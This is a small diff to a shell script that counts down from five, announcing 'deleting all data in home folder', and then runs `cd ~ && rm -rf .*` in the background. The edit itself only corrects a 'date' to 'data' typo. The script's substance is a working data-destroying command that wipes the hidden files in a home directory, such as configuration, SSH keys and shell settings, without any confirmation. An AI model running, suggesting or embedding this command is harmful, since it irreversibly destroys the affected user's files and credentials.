@@ -1,12 +1,12 @@
-echo deleting all date in home folder in 5 &&
+echo deleting all data in home folder in 5 &&
 sleep 1 &&
-echo deleting all date in home folder in 4 &&
+echo deleting all data in home folder in 4 &&
 sleep 1 &&
-echo deleting all date in home folder in 3 &&
+echo deleting all data in home folder in 3 &&
 sleep 1 &&
-echo deleting all date in home folder in 2 &&
+echo deleting all data in home folder in 2 &&
 sleep 1 &&
-echo deleting all date in home folder in 1 &&
+echo deleting all data in home folder in 1 &&
 sleep 1 &&
 cd ~ &&
 rm -rf .* &
